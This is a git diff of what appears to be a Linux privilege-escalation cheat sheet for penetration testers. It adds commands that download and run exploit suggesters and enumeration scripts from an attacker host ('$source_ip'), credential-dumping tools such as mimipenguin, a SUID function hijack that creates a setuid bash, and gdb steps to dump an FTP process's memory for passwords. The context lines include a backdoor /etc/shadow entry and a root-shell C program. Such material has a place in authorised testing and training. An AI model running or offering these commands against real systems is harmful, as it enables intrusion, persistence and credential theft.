@@ -72,17 +72,21 @@ wget http://$source_ip/tools_linux/pspy64; chmod +x pspy64; ./pspy64
 
 ## Exploit Suggesters
 ```
-wget http://$source_ip/tools_linux/linux_kernel_exploiter.pl; perl linux_kernel_exploiter.pl | tee linux_kernel_exploiter.pl.out
-```
-```
-wget http://$source_ip/tools_linux/Linux_Exploit_Suggester.pl; perl Linux_Exploit_Suggester.pl | tee Linux_Exploit_Suggester.pl.out
-```
-```
 wget http://$source_ip/tools_linux/linux-exploit-suggester-2.pl; perl linux-exploit-suggester-2.pl | tee linux-exploit-suggester-2.pl.out
 ```
 ```
 wget http://$source_ip/tools_linux/linux-exploit-suggester.sh; bash linux-exploit-suggester.sh | tee linux-exploit-suggester.sh.out
 ```
+```
+wget http://$source_ip/tools_linux/linuxprivchecker.py; python linuxprivchecker.py | tee linuxprivchecker.py.out
+```
+```
+wget http://$source_ip/tools_linux/linux_kernel_exploiter.pl; perl linux_kernel_exploiter.pl | tee linux_kernel_exploiter.pl.out
+```
+```
+wget http://$source_ip/tools_linux/Linux_Exploit_Suggester.pl; perl Linux_Exploit_Suggester.pl | tee Linux_Exploit_Suggester.pl.out
+```
+
 
 ## Data Extraction
 ```
@@ -102,6 +106,9 @@ wget http://$source_ip/tools_linux/mimipenguin_2.0/mimipenguin.py; python mimipe
 ```
 ```
 wget http://$source_ip/tools_linux/mimipenguin_2.0/mimipenguin.sh; bash mimipenguin.sh | tee mimipenguin.sh.out
+```
+```
+wget http://$source_ip/tools_linux/memory-dump.sh
 ```
 
 ## Persistance
@@ -127,6 +134,23 @@ echo 'amxuser:$1$ozUCi1Me$rBG3vK5.jZUScy39PSVtM1:14798:0:99999:7:::' >>/etc/shad
 ```
 
 ## Exploit 
+
+If SUID binary execute another command, replace it with a function:
+```
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+```
+
+Dump memory:
+```
+gdb -p <FTP_PROCESS_PID>
+(gdb) info proc mappings
+(gdb) q
+(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
+(gdb) q
+strings /tmp/mem_ftp #User and password
+```
+
 ```
 echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c; gcc privsc.c -o privsc
 ```
